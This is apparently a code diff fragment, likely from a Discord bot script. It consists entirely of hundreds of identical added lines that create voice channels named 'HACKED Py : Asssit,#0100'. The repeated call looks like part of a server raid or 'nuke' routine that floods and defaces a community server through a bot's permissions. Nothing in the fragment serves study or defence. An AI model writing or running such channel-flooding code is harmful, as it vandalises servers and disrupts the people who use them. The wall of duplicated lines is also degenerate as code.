+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
